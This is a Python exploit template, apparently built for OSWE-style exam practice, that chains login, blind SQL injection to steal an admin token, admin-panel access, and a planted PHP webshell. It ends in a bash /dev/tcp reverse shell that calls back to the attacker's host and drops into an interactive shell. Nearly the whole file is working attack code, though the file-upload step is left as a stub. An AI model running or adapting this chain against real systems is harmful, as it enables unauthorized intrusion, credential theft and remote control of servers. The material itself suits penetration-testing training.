#!/usr/bin/env python3
"""
OSWE Step-Based Exploit Example

This example demonstrates the step-based exploitation pattern using the
advanced skeleton modules. Step-based is ideal for:
- Linear exploits with clear sequential steps
- Simple authentication -> extraction -> exploitation flows
- When you don't need complex dependencies or retries

Compare this to stage-based pattern in poc_advanced.py:
- Stage-based: Better for complex orchestration, dependencies, retries
- Step-based: Better for linear, straightforward exploits

This example simulates:
1. Authenticate to application
2. Extract admin token via SQL injection  
3. Use token to access admin panel
4. Upload webshell via file upload vulnerability
5. Trigger reverse shell

Usage:
    python3 step_based_example.py --target-ip 192.168.1.100 --username admin --password secret
"""

import argparse
import requests
import sys
from dataclasses import dataclass, field
from typing import Optional
import urllib3

from modules import (
    create_logger,
    InteractiveListener,
    PayloadServer,
    BlindSQLi,
    MySQLDialect
)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


# ============================================================================
# EXPLOIT CONTEXT
# ============================================================================

@dataclass(slots=True)
class ExploitContext:
    """Exploit configuration and state."""
    
    # Required configuration
    target_ip: str
    target_port: int
    attacker_ip: str
    attacker_port: int
    payload_port: int
    
    # Optional configuration
    protocol: str = "http"
    delay: int = 3
    proxy: Optional[str] = None
    username: Optional[str] = None
    password: Optional[str] = None
    
    # Runtime state
    session: requests.Session = field(default_factory=requests.Session, repr=False)
    logger = None
    listener: Optional[InteractiveListener] = field(default=None, repr=False)
    payload_server: Optional[PayloadServer] = field(default=None, repr=False)
    
    # Exploit state tracking
    authenticated: bool = field(default=False, repr=False)
    admin_token: Optional[str] = field(default=None, repr=False)
    shell_url: Optional[str] = field(default=None, repr=False)

    def get_base_url(self) -> str:
        return f"{self.protocol}://{self.target_ip}:{self.target_port}"

    def get_proxies(self) -> Optional[dict]:
        if self.proxy:
            return {"http": self.proxy, "https": self.proxy}
        return None


# ============================================================================
# ARGUMENT PARSING
# ============================================================================

def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="Step-Based Exploit Example")
    
    parser.add_argument("--target-ip", required=True, help="Target IP")
    parser.add_argument("--target-port", type=int, default=80, help="Target port")
    parser.add_argument("--listening-ip", default="127.0.0.1", help="Attacker IP")
    parser.add_argument("--listening-port", type=int, default=4444, help="Listener port")
    parser.add_argument("--payload-port", type=int, default=8000, help="Payload port")
    parser.add_argument("--username", help="Username")
    parser.add_argument("--password", help="Password")
    parser.add_argument("--proxy", help="HTTP proxy")
    parser.add_argument("--verbose", action="store_true", help="Verbose output")
    
    return parser.parse_args()


# ============================================================================
# EXPLOIT STEPS
# ============================================================================

def step1_authenticate(ctx: ExploitContext) -> bool:
    """
    Step 1: Authenticate to the application.
    
    Stores authentication state in ctx.authenticated and session cookie
    is automatically maintained by ctx.session.
    """
    ctx.logger.stage("Step 1: Authentication")
    
    if not ctx.username or not ctx.password:
        ctx.logger.warning("No credentials provided, skipping authentication")
        return True
    
    login_url = f"{ctx.get_base_url()}/login"
    data = {"username": ctx.username, "password": ctx.password}
    
    try:
        ctx.logger.http_request("POST", login_url, data=data)
        response = ctx.session.post(
            login_url, data=data, verify=False, 
            proxies=ctx.get_proxies(), timeout=10
        )
        ctx.logger.http_response(response.status_code, login_url)
        
        if response.status_code == 200 and "dashboard" in response.text.lower():
            ctx.authenticated = True
            ctx.logger.success(f"Authenticated as {ctx.username}")
            ctx.logger.credential(ctx.username, ctx.password, "login")
            return True
        else:
            ctx.logger.error("Authentication failed")
            return False
            
    except Exception as e:
        ctx.logger.error(f"Authentication error: {e}")
        return False


def step2_extract_token(ctx: ExploitContext) -> bool:
    """
    Step 2: Extract admin token via SQL injection.
    
    Uses BlindSQLi module to extract sensitive data.
    Stores extracted token in ctx.admin_token.
    """
    ctx.logger.stage("Step 2: Token Extraction via SQLi")
    
    # Configure blind SQL injection
    sqli = BlindSQLi(
        url=f"{ctx.get_base_url()}/search",
        dialect=MySQLDialect(),
        delay=ctx.delay,
        param_name="q",
        injection_point="test{payload}",
        logger=ctx.logger
    )
    
    try:
        ctx.logger.info("Extracting admin token...")
        
        # Extract token (this is example - customize query for your target)
        token = sqli.extract(
            "SELECT token FROM admin_tokens LIMIT 1",
            use_binary=True
        )
        
        if token:
            ctx.admin_token = token
            ctx.logger.success(f"Token extracted: {token[:20]}...")
            return True
        else:
            ctx.logger.error("Failed to extract token")
            return False
            
    except Exception as e:
        ctx.logger.error(f"SQLi extraction error: {e}")
        return False


def step3_access_admin(ctx: ExploitContext) -> bool:
    """
    Step 3: Access admin panel using extracted token.
    
    Uses ctx.admin_token from previous step to access protected functionality.
    """
    ctx.logger.stage("Step 3: Access Admin Panel")
    
    if not ctx.admin_token:
        ctx.logger.error("No admin token available")
        return False
    
    admin_url = f"{ctx.get_base_url()}/admin"
    headers = {"X-Admin-Token": ctx.admin_token}
    
    try:
        ctx.logger.info("Accessing admin panel...")
        response = ctx.session.get(
            admin_url, headers=headers,
            verify=False, proxies=ctx.get_proxies(), timeout=10
        )
        
        if response.status_code == 200:
            ctx.logger.success("Admin panel accessed")
            return True
        else:
            ctx.logger.error(f"Admin access failed: HTTP {response.status_code}")
            return False
            
    except Exception as e:
        ctx.logger.error(f"Admin access error: {e}")
        return False


def step4_upload_shell(ctx: ExploitContext) -> bool:
    """
    Step 4: Upload webshell via file upload vulnerability.
    
    Uses the payload server to host the shell and uploads it.
    Stores shell URL in ctx.shell_url.
    """
    ctx.logger.stage("Step 4: Webshell Upload")
    
    # Setup payload server
    ctx.payload_server = PayloadServer(port=ctx.payload_port, verbose=False)
    
    # Create webshell
    php_shell = """<?php if(isset($_REQUEST['cmd'])){ system($_REQUEST['cmd']); } ?>"""
    ctx.payload_server.add_payload("/shell.php", php_shell, "application/x-php")
    
    if not ctx.payload_server.start(blocking=False):
        ctx.logger.error("Failed to start payload server")
        return False
    
    ctx.logger.success(f"Payload server started: {ctx.payload_server.get_url()}")
    
    # TODO: Implement actual file upload exploit here
    # Example:
    # upload_url = f"{ctx.get_base_url()}/admin/upload"
    # files = {"file": ("shell.php", php_shell, "application/x-php")}
    # response = ctx.session.post(upload_url, files=files, ...)
    
    ctx.logger.warning("File upload implementation needed - customize for your target")
    
    # For demo, assume shell is at /uploads/shell.php
    ctx.shell_url = f"{ctx.get_base_url()}/uploads/shell.php"
    ctx.logger.info(f"Shell URL: {ctx.shell_url}")
    
    return True


def step5_trigger_reverse_shell(ctx: ExploitContext) -> bool:
    """
    Step 5: Trigger reverse shell and capture it.
    
    Starts listener, triggers shell via webshell, and enters interactive mode.
    """
    ctx.logger.stage("Step 5: Reverse Shell")
    
    # Start listener
    ctx.listener = InteractiveListener(
        port=ctx.attacker_port,
        initial_commands=["whoami", "hostname", "id", "pwd"]
    )
    
    if not ctx.listener.start(blocking=False):
        ctx.logger.error("Failed to start listener")
        return False
    
    ctx.logger.success(f"Listener started on port {ctx.attacker_port}")
    
    # Trigger reverse shell via webshell
    if ctx.shell_url:
        rev_shell_cmd = (
            f"bash -c 'bash -i >& /dev/tcp/{ctx.attacker_ip}/{ctx.attacker_port} 0>&1'"
        )
        
        trigger_url = f"{ctx.shell_url}?cmd={requests.utils.quote(rev_shell_cmd)}"
        ctx.logger.info("Triggering reverse shell...")
        
        try:
            # Fire-and-forget request to trigger shell
            ctx.session.get(trigger_url, verify=False, proxies=ctx.get_proxies(), timeout=2)
        except:
            pass  # Expected timeout
    
    # Wait for and handle connection
    ctx.logger.info("Waiting for connection (60s timeout)...")
    
    if ctx.listener.wait_for_connection(timeout=60):
        ctx.logger.success("Shell connected!")
        
        # Enter interactive shell
        ctx.listener.interactive_shell()
        return True
    else:
        ctx.logger.error("No connection received")
        return False


# ============================================================================
# MAIN EXECUTION
# ============================================================================

def main():
    """Execute exploit steps in sequence."""
    
    # Parse arguments
    args = parse_args()
    
    # Create logger
    log = create_logger("step_based_exploit", verbose=args.verbose)
    log.info("Step-Based Exploit Example")
    log.info("=" * 60)
    
    # Build context
    ctx = ExploitContext(
        target_ip=args.target_ip,
        target_port=args.target_port,
        attacker_ip=args.listening_ip,
        attacker_port=args.listening_port,
        payload_port=args.payload_port,
        proxy=args.proxy,
        username=args.username,
        password=args.password
    )
    ctx.logger = log
    
    # Execute steps
    steps = [
        ("Authentication", step1_authenticate),
        ("Token Extraction", step2_extract_token),
        ("Admin Access", step3_access_admin),
        ("Shell Upload", step4_upload_shell),
        ("Reverse Shell", step5_trigger_reverse_shell),
    ]
    
    success = True
    completed_steps = []
    
    for step_name, step_func in steps:
        if not step_func(ctx):
            log.error(f"Step failed: {step_name}")
            success = False
            break
        completed_steps.append(step_name)
    
    # Summary
    log.info("=" * 60)
    log.summary(
        Target=ctx.get_base_url(),
        Steps_Completed=len(completed_steps),
        Steps_Failed=len(steps) - len(completed_steps),
        Shell_URL=ctx.shell_url or "N/A",
        Overall_Status="SUCCESS" if success else "FAILED"
    )
    
    # Cleanup
    if ctx.payload_server:
        ctx.payload_server.stop()
    if ctx.listener:
        ctx.listener.stop()
    
    log.close()
    sys.exit(0 if success else 1)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"\n[-] Error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
